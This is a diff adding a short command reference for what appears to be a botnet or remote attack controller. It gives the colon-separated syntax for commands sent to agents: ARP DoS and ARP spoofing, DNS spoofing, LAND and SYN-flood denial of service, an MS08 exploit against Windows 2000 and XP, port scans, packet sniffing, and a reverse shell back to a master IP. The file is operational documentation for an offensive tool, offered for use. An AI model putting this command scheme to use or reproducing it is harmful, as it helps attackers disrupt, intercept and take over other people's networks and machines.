@@ -1,0 +1,71 @@
+All commands are reverted by sending the command
+	"restore"
+
+Arp Dos:
+	send-> 	arpdos:source->list of source ips separated by ":"
+			arpdos:masq->list of masq ips separated by ":"
+			arpdos:dest->list of dest ips separated by ":"
+	command->
+		arpdos:<masq>:<source>:<dest>
+		
+Arp Spoof:
+	send-> 	arpspoof:source->list of source ips separated by ":"
+			arpspoof:masq->list of masq ips separated by ":"
+			arpspoof:dest->list of dest ips separated by ":"
+	command->
+		arpspoof:<masq>:<source>:<dest>
+		
+DNS Spoof:
+	send->	dnsspoof:target->list of target ips separated by ":"
+	
+	command->
+		dnsspoof:<target>:<site>:<newSite>
+		
+DOS Land:
+	send->	dosland:target->list of target ips separated by ":"
+	
+	command->
+		dosland:<port>:<target>:<site>
+
+DOS Syn DOS:
+	send->	dossyndos:target->list of target ips separated by ":"
+	
+	command->
+		dossyndos:<port>:<target>:<interval>:<threads>:<verbose>
+		
+MS08 Exploit:
+	send->	ms08exploit:target->list of target ips separated by ":"
+	
+	command->
+		ms08exploit:<port>:<target>:<version>
+		version is 1 for win2000 or 2 or winxp
+		
+NMap Scan:
+	send->	nmapscan:host->list of hosts separated by ":"
+	
+	command->
+		nmapscan:<host>:<portmin>:<portmax>
+
+ReverseShell:
+	send->	reverseshell:master->list of master ips separated by ":"
+	
+	command->
+		reverseshell:<master>:<localport>:<username>:<remoteport>:<publickey>
+
+SniffPack:
+	send-> nothing
+	
+	command->
+		sniffpack:<rate>:<folder>
+		
+SynScan:
+	send-> 	synscan:target->list of target ips separated by ":"
+	
+	command->
+		synscan:<target>:<portmin>:<portmax>
+		
+
+		
+		
+		
+		
